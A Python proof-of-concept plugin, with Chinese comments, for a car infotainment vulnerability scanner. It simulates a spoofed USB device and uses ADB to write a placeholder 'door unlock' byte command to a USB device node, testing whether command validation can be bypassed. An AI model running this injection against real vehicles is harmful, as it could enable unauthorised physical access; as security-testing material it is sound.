#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
usb_injection_via_adb.py

模拟恶意USB设备注入攻击（通过ADB转发指令）
功能：伪装合法车载USB设备（如导航模块），构造恶意控制指令并通过ADB发送至车载系统，
验证是否存在指令校验绕过漏洞（例如车门解锁等非授权操作）。
"""
POC_TAG = "37. 检测设备是否存在USB伪装命令注入漏洞..."

import argparse
import logging
import subprocess
import sys
from datetime import datetime

# 日志配置
logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

# ADB 命令基础配置
ADB_CMD = "adb"
CMD_TIMEOUT = 10.0  # 命令超时时间（秒）

# 目标设备信息（模拟合法USB设备的 Vendor/Product ID）
TARGET_VID = "0x18d1"  # 常见Android Automotive 厂商ID
TARGET_PID = "0x4ee0"  # 对应产品ID

# 恶意指令构造（参考图片中的字节数组，可根据实际场景调整）
MALICIOUS_COMMAND = bytearray([
    0x01, 0x00, 0x00, 0x00,  # 指令头：伪装合法请求
    0x7f, 0x12, 0x34, 0x56,  # 漏洞触发关键参数（绕过校验）
    0x02, 0x00, 0x01  # 指令内容：示例为车门解锁信号
])


def run_adb_command(cmd: list, device_serial: str = None) -> tuple:
    """
    执行ADB命令（修复参数顺序：不带默认值的cmd在前，带默认值的device_serial在后）
    :param cmd: 命令列表（如 ["shell", "ls"]）
    :param device_serial: 设备序列号（可选，指定特定设备）
    :return: (退出码, 输出内容)
    """
    full_cmd = [ADB_CMD]
    if device_serial:
        full_cmd.extend(["-s", device_serial])
    full_cmd.extend(cmd)

    try:
        logging.debug(f"执行ADB命令: {' '.join(full_cmd)}")
        result = subprocess.run(
            full_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=CMD_TIMEOUT,
            check=False
        )
        # 解码输出（兼容中文）
        output = result.stdout.decode("utf-8", errors="ignore").strip()
        error = result.stderr.decode("utf-8", errors="ignore").strip()
        return result.returncode, output + (f"\n错误: {error}" if error else "")
    except subprocess.TimeoutExpired:
        return -1, f"ADB命令超时（>{CMD_TIMEOUT}秒）"
    except FileNotFoundError:
        return -2, "未找到ADB工具，请将ADB添加到系统PATH或放在脚本目录"
    except Exception as e:
        return -3, f"ADB命令执行失败: {str(e)}"


def check_device_connected(device_serial: str = None) -> bool:
    """检查目标设备是否通过ADB连接"""
    # 调用时调整参数顺序（cmd在前，device_serial在后）
    code, output = run_adb_command(["shell", "echo", "connected"], device_serial)
    if code == 0 and "connected" in output:
        logging.info("设备已通过ADB连接")
        return True
    logging.error(f"设备连接失败: {output}")
    return False


def simulate_usb_identification(device_serial: str = None) -> bool:
    """模拟USB设备识别过程（检查目标VID/PID是否存在）"""
    logging.info(f"模拟USB设备识别: VID={TARGET_VID}, PID={TARGET_PID}")

    # 通过ADB查询已连接的USB设备列表（需设备支持lsusb命令）
    code, output = run_adb_command(["shell", "lsusb"], device_serial)
    if code != 0:
        logging.warning(f"无法获取USB设备列表（设备可能不支持lsusb），跳过识别检查: {output}")
        return True  # 不强制校验，继续执行后续步骤

    # 检查目标VID/PID是否在列表中
    if TARGET_VID.lower() in output.lower() and TARGET_PID.lower() in output.lower():
        logging.info(f"检测到目标USB设备 (VID={TARGET_VID}, PID={TARGET_PID})")
        return True
    else:
        logging.warning(f"未检测到目标USB设备，仍尝试发送指令...")
        return True  # 即使未识别到，仍尝试发送指令（兼容模拟场景）


def send_malicious_command(device_serial: str = None) -> bool:
    """通过ADB发送恶意指令（模拟USB注入）"""
    logging.info("开始发送恶意控制指令...")

    # 将字节数组转换为十六进制字符串（便于ADB传输）
    cmd_hex = ''.join(f"\\x{b:02x}" for b in MALICIOUS_COMMAND)
    logging.debug(f"恶意指令（十六进制）: {cmd_hex}")

    # 通过ADB shell向USB设备节点写入指令（需根据实际设备调整节点路径）
    # 车载系统常见USB设备节点：/dev/bus/usb/xxx/xxx 或 /sys/class/usb_device/...
    # 此处使用通用写法，实际场景需替换为目标设备的USB节点
    usb_node = "/dev/bus/usb/001/002"  # 示例节点，需根据实际情况修改
    adb_cmd = [
        "shell",
        f"echo -ne '{cmd_hex}' > {usb_node} 2>/dev/null && echo '指令发送成功' || echo '指令发送失败'"
    ]

    # 调用时调整参数顺序
    code, output = run_adb_command(adb_cmd, device_serial)
    if "指令发送成功" in output:
        logging.info("恶意指令已通过ADB发送至目标设备！")
        return True
    else:
        logging.info(f"指令发送失败: {output}")
        return False


def run_check():
    parser = argparse.ArgumentParser(description="USB注入测试脚本（通过ADB转发）")
    parser.add_argument("--serial", help="指定设备序列号（可选，多设备时需指定）")
    args = parser.parse_args()

    # 步骤1：检查设备连接
    if not check_device_connected(args.serial):
        sys.exit(1)

    # 步骤2：模拟USB设备识别
    if not simulate_usb_identification(args.serial):
        sys.exit(1)

    # 步骤3：发送恶意指令
    send_success = send_malicious_command(args.serial)

    # 步骤4：输出结果与验证建议
    print("\n" + "=" * 50)
    print(f"测试时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"目标设备: {args.serial if args.serial else '默认设备'}")
    print(f"指令内容: {MALICIOUS_COMMAND.hex(' ')}")
    print("=" * 50)

    if send_success:
        logging.warning("\n【漏洞验证提示】")
        logging.warning("1. 请观察车载系统是否执行了非授权操作（如车门解锁、后备箱开启等）")
        logging.warning("2. 若操作被执行，说明存在指令校验绕过漏洞")
        logging.warning("3. 若未执行，可能是指令格式错误或设备已修复漏洞")
    else:
        logging.info("\n【测试提示】")
        logging.info("1. 请检查USB设备节点路径是否正确（当前使用: /dev/bus/usb/001/002）")
        logging.info("2. 确认设备已root或拥有写入USB节点的权限")
        logging.info("3. 尝试替换为其他可能的USB节点（如/dev/usb_device/*）")
        logging.info("4. 执行 'adb shell ls /dev/bus/usb' 可查看设备真实USB节点路径")

    return send_success



# Standard plugin facade for the migrated legacy main() implementation.
from iv_plugin_base import IVIVulnerabilityPlugin
from poc_runtime_adapter import execute_check_callable


class Poc37UsbInjectPlugin(IVIVulnerabilityPlugin):
    meta_poc_name = '检测设备是否存在USB伪装命令注入漏洞...'
    meta_cve_id = 'CWE-20'
    meta_severity = 'High'
    meta_protocol = 'usb'
    meta_target_os = ['android']
    meta_required_params = ['expected_usb_serial']
    meta_profiles = ['usb_adb']
    meta_attack_surface = '固件/USB/OTA'
    is_disruptive = True
    meta_destructive_level = 'Disruptive'

    def check_prerequisites(self):
        return True

    def exploit(self):
        return execute_check_callable(run_check, self)
